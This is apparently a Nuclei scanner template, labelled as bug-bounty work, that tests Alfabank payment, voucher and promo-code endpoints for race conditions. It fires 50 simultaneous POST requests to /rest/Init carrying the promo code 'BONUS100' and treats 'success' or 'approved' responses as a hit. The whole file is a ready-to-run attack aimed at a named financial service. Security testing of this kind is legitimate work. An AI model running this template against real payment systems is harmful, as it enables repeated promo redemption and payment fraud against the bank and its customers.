id: alfabank-race-condition

info:
  name: Alfabank - Race Condition Vulnerabilities
  author: bugbounty
  severity: high
  description: Race condition in payment, voucher, promo code endpoints
  tags: race-condition,alfabank

http:
  - raw:
      - |
        POST /rest/Init HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"Amount":1000,"OrderId":"race-test-{{rand_int(1000,9999)}}","promoCode":"BONUS100"}

    threads: 50
    attack: race

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        part: body
        words:
          - "success"
          - "approved"
          - "BONUS100"
